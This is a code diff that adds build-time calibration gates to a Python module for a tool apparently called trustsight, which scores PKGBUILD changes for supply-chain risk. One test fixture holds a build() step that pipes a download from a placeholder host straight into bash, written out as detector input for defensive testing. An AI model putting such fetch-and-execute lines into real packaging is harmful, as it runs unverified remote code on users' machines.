@@ -893,6 +893,287 @@ def _anchor(heading: str) -> str:
     return _ATX_PUNCT_RE.sub("", text.lower()).replace(" ", "-")
 
 
+# B9.  Phrases whose plain reading is "you may proceed".  A template that
+# says one of these defeats B6 no matter what B6 says, because the prose is
+# what most readers act on.  Checked over the template strings rather than
+# at runtime, so it costs nothing and fails the build when someone adds a
+# friendly-sounding string.
+_PERMISSION_PHRASES = (
+    "no issues", "looks fine", "looks good", "nothing to review",
+    "no need to review", "safe to install", "safe to update", "safe to build",
+    "you may proceed", "good to go", "all clear", "verified safe",
+    "no action needed", "no concerns", "appears safe", "is safe",
+)
+# "clean" is banned as a verdict word but appears legitimately in prose such
+# as "a clean diff".  Only the verdict-shaped uses are denied.
+_PERMISSION_REGEXES = (
+    r"\bpackage is clean\b", r"\bverdict:?\s*clean\b", r"\bno risk\b",
+    r"\bnothing (?:to worry|suspicious found)\b",
+)
+
+
+def gate_no_template_grants_permission() -> Gate:
+    """B9: no rendered string says or implies that reading the diff is optional.
+
+    Including when nothing fired.  The trivial case must state a fact, not
+    issue a clearance: "Only pkgver and sha256sums changed. Review the diff
+    before building."
+    """
+    import trustsight.findings as findings
+    import trustsight.verdict as verdict
+
+    problems = []
+    strings: list[tuple[str, str]] = [
+        (f"findings.TEMPLATES[{k}]", v) for k, v in findings.TEMPLATES.items()
+    ]
+    for module in (verdict, findings):
+        source = (SRC / Path(module.__file__).name).read_text()
+        for lineno, line in enumerate(source.splitlines(), start=1):
+            for literal in re.findall(r'"([^"]{8,})"|\'([^\']{8,})\'', line):
+                text = literal[0] or literal[1]
+                strings.append((f"{Path(module.__file__).name}:{lineno}", text))
+
+    for where, text in strings:
+        low = text.lower()
+        for phrase in _PERMISSION_PHRASES:
+            if phrase in low:
+                problems.append(f"{where}: {phrase!r}")
+        for pattern in _PERMISSION_REGEXES:
+            if re.search(pattern, low):
+                problems.append(f"{where}: matches {pattern}")
+    return Gate("no template grants permission to skip", not problems,
+                problems or f"{len(strings)} strings checked")
+
+
+def gate_content_findings_carry_a_location() -> Gate:
+    """B8: a finding a reader can open and confirm is a different object
+    from an assertion they must trust.
+
+    Content rules report ``file`` and ``line``.  Rules that legitimately
+    cannot (maintainer, temporal, corpus, graph) must say so explicitly:
+    a missing location must not be indistinguishable from a rule that
+    forgot to set one.
+    """
+    from trustsight.analysis import scan_diff
+    from trustsight.findings import NON_CONTENT_RULES
+
+    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
+    body = (
+        "+build() {\n"
+        "+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n"
+        "+}\n"
+        "+source=(\"https://example.invalid/a.tar.gz\")\n"
+        "+sha256sums=('SKIP')\n"
+    )
+    fact = scan_diff(header + body, package_name="demo")
+
+    problems = []
+    for entry in fact.score_breakdown:
+        rid = entry.rule_id
+        if rid.startswith("P") and rid[1:].isdigit():
+            continue
+        if rid in ("COVERAGE", "NOVELTY", "SOURCE_BUCKET"):
+            continue
+        if rid in NON_CONTENT_RULES:
+            continue
+        if entry.line is None:
+            problems.append(f"{rid} is a content rule with no line")
+    return Gate("content findings carry a location", not problems,
+                problems or len(fact.score_breakdown))
+
+
+def gate_flag_threshold_is_derived() -> Gate:
+    """B2 addendum: the 20-point threshold is measured, not chosen.
+
+    A reader cannot tell whether 20 is calibration or preference unless the
+    page says where it comes from, so the page must state it and the number
+    must match the constant the code uses.
+    """
+    from trustsight.scoring import FLAG_THRESHOLD
+
+    doc = (ROOT / "docs" / "security.md").read_text()
+    problems = []
+    if f"at or below {FLAG_THRESHOLD} points" not in doc:
+        problems.append(f"security.md does not state the threshold ({FLAG_THRESHOLD})")
+    # The basis must be stated *and* must not claim a percentile the corpus
+    # no longer supports.  20 was the benign 95th percentile before B10 and
+    # is not now, so a page that still says so is publishing a stale number.
+    if "benign 95th percentile" not in doc:
+        problems.append("security.md does not state the measured benign p95")
+    if "malicious 5th percentile" not in doc:
+        problems.append("security.md does not state the measured malicious p5")
+    stale = f"threshold is the 95th percentile"
+    if stale in doc:
+        problems.append("security.md still claims 20 is the benign 95th percentile")
+    return Gate("the flag threshold is derived, not copied", not problems,
+                problems or FLAG_THRESHOLD)
+
+
+def gate_result_reports_what_changed() -> Gate:
+    """B7: every result carries a change summary, findings or not."""
+    from trustsight.analysis import scan_diff
+    from trustsight.schema import PackageFact
+    from trustsight.changes import ALWAYS_NOISY, summarise
+
+    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
+    quiet = header + "-pkgver=1.2.3\n+pkgver=1.2.4\n"
+    fact = scan_diff(quiet, package_name="demo")
+
+    problems = []
+    if not fact.changes:
+        problems.append("a result with no findings reported no changes either")
+    if not any("1.2.4" in c for c in fact.changes):
+        problems.append("the version move was not reported")
+    # Always-noisy files must not be listed.
+    noisy = PackageFact()
+    noisy.diff_summary.file_changes = [{"path": p, "status": "modified"}
+                                       for p in ALWAYS_NOISY]
+    if any(p in " ".join(summarise(noisy)) for p in ALWAYS_NOISY):
+        problems.append("a always-noisy file was listed")
+    return Gate("a result reports what changed", not problems,
+                problems or fact.changes)
+
+
+def gate_change_entries_carry_no_severity() -> Gate:
+    """B7: changes are context, not findings.
+
+    They must never acquire a severity, a weight, or a place in
+    ``triggered_rules``; conflating the two would corrupt the calibration
+    and the reader's sense of what a finding means.
+    """
+    from trustsight.analysis import scan_diff
+
+    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
+    fact = scan_diff(header + "-pkgver=1\n+pkgver=2\n+source=(\"https://x.invalid/a\")\n",
+                     package_name="demo")
+    problems = []
+    if not all(isinstance(c, str) for c in fact.changes):
+        problems.append("a change entry is not a plain string")
+    fired = {e.rule_id for e in fact.score_breakdown}
+    if any(c in fired for c in fact.changes):
+        problems.append("a change entry reached the score breakdown")
+    return Gate("change entries carry no severity", not problems,
+                problems or len(fact.changes))
+
+
+def gate_positive_evidence_never_scores() -> Gate:
+    """B10: declared practice is reported, never credited."""
+    from trustsight.schema import NoveltyContext
+    from trustsight.scoring import calculate_score
+
+    maximal = dict(
+        verification_evidence=["checksum_present", "validpgpkeys_declared",
+                               "gpg_verify_present"],
+        pinning_level="checksum_pinned",
+    )
+    buckets = {"https://github.com/a/b.tar.gz": "trusted_forge"}
+    triggered = [{"rule_id": "R001", "severity": "HIGH", "name": "x", "match": ""}]
+
+    bare, _, _ = calculate_score(triggered, {}, NoveltyContext())
+    rich, breakdown, _ = calculate_score(triggered, buckets, NoveltyContext(), **maximal)
+
+    problems = []
+    if rich != bare:
+        problems.append(f"declared evidence moved the score: {bare} -> {rich}")
+    positives = [e for e in breakdown
+                 if e.rule_id.startswith("P") and e.rule_id[1:].isdigit()]
+    if not positives:
+        problems.append("no declared-practice finding was emitted")
+    for entry in positives:
+        if entry.weight != 0 or entry.severity != "INFO":
+            problems.append(f"{entry.rule_id} is {entry.severity} weight {entry.weight}")
+    return Gate("positive evidence never changes the score", not problems,
+                problems or sorted(e.rule_id for e in positives))
+
+
+def gate_declared_findings_fire_under_shipped_config() -> Gate:
+    """Every declared-practice finding is reachable with the config that ships.
+
+    P007 was emitted from inside an ``if modifier < 0`` branch.  When B10
+    set ``trusted_forge = 0`` the branch became unreachable, so the finding
+    stopped existing in production while still firing in the test suite,
+    whose fixture config still carried the old ``-10``.  Seven documentation
+    pages described a finding that could not occur.
+
+    This is the entry-point failure from
+    [reviewing a security control](../docs/contributing/security-review.md)
+    wearing a different hat: the check pointed at a configuration the tool
+    does not use.  So the reachability check runs against the shipped
+    config, in a temp dir, with a cold database, and uses one recipe per
+    practice rather than one recipe for all of them: a single PKGBUILD
+    cannot be both commit-pinned and tag-pinned, and mixing checksummed and
+    SKIP sources suppresses the checksum evidence entirely.
+    """
+    from calibration_gates import shipped_config
+
+    from trustsight.analysis import scan_diff
+    from trustsight.config import load_config, load_rules
+    from trustsight.scoring import DECLARED_REASONS
+
+    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
+    digest = "3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
+    recipes = {
+        # A checksummed tarball is both "checksums declared" and, because
+        # the digest pins the artifact, "pinned by checksum".
+        "P001": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
+        "P005": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
+        "P002": header + '+validpgpkeys=(\'ABCDEF0123456789ABCDEF0123456789ABCDEF01\')\n',
+        "P003": header + '+  gpg --verify d.tar.gz.asc\n',
+        # A versioned path with no digest: pinned to a tag, which is the
+        # weaker form, since a tag can be repointed.
+        "P006": header + '+source=("https://ex.invalid/d/archive/v1.2.3.tar.gz")\n+sha256sums=(\'SKIP\')\n',
+        "P007": header + '+source=("https://github.com/d/d/archive/v1.tar.gz")\n',
+    }
+
+    problems = []
+    fired: dict[str, bool] = {}
+    with shipped_config():
+        config, rules = load_config(), load_rules()
+        for expected, diff in recipes.items():
+            fact = scan_diff(diff, rules=rules, config=config, package_name="demo")
+            seen = {e.rule_id for e in fact.score_breakdown}
+            fired[expected] = expected in seen
+            if expected not in seen:
+                problems.append(f"{expected} unreachable: got {sorted(seen)}")
+            for entry in fact.score_breakdown:
+                if entry.rule_id in DECLARED_REASONS and entry.weight != 0:
+                    problems.append(f"{entry.rule_id} carries weight {entry.weight}")
+
+    undocumented = sorted(set(DECLARED_REASONS) - set(recipes))
+    if undocumented:
+        problems.append(f"no reachability recipe for {undocumented}")
+    return Gate("declared findings fire under the shipped config",
+                not problems, problems or sorted(fired))
+
+
+def gate_positive_evidence_cannot_lower_a_fatal() -> Gate:
+    """B10 + B4, stated as the attack: sign the package, then steal.
+
+    Redundant given the gate above, and kept anyway: a refactor that
+    reintroduces credit should fail on the case that matters rather than
+    on an abstract one.
+    """
+    from trustsight.schema import NoveltyContext
+    from trustsight.scoring import calculate_score
+
+    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection",
+                  "match": ""}]
+    score, _, level = calculate_score(
+        triggered, {"https://github.com/a/b.tar.gz": "trusted_forge"},
+        NoveltyContext(),
+        verification_evidence=["checksum_present", "validpgpkeys_declared",
+                               "gpg_verify_present"],
+        pinning_level="checksum_pinned",
+    )
+    problems = []
+    if score != 100:
+        problems.append(f"maximal declared evidence pulled a FATAL to {score}")
+    if level != "Critical":
+        problems.append(f"band was {level!r}")
+    return Gate("positive evidence cannot lower a FATAL", not problems,
+                problems or score)
+
+
 def gate_doc_cross_references_resolve() -> Gate:
     """Every link between the docs points at a file and anchor that exist.
 
@@ -1004,6 +1285,14 @@ def run_gates() -> list[Gate]:
         gate_seed_cannot_rewrite_the_database(),
         gate_reserved_names_are_refused_everywhere(),
         gate_a_baseline_supplies_state_not_rules(),
+        gate_result_reports_what_changed(),
+        gate_change_entries_carry_no_severity(),
+        gate_positive_evidence_never_scores(),
+        gate_positive_evidence_cannot_lower_a_fatal(),
+        gate_declared_findings_fire_under_shipped_config(),
+        gate_no_template_grants_permission(),
+        gate_content_findings_carry_a_location(),
+        gate_flag_threshold_is_derived(),
         gate_doc_cross_references_resolve(),
     ]
     gates.append(gate_doc_lists_every_gate(gates))
